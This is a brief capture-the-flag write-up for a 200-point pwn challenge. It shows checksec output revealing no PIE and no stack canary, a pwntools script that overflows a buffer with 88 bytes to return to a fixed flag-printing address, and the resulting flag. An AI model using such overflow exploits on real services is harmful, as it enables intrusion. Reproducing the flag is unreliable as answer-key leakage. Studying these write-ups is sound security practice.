---
ai_date: 2025-04-27 05:25:47
ai_summary: No PIE and no stack canary allow for buffer overflow exploitation, leading to flag retrieval
ai_tags:
  - bof
  - stack-overflow
  - exploitation
created: 2025-03-02T08:49
points: 200
solves: 11
updated: 2025-07-14T09:46
---

```bash
$ checksec --file=server
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0 server
```

- No PIE: Addresses are fixed.
- No Stack Canary: Free-for-all stack smashing.

We should be able to simply return to the print flag part.

```python
from pwn import *

r = remote('localhost', 21504)

offset = 88
flag_addr = 0x40167C

payload = b'A' * offset + p64(flag_addr)
r.sendline(payload)
r.interactive()
```

```flag
ATHACKCTF{0xdeadbeef_5t4ck_8453d_8uff3r_0v3rf10w}
```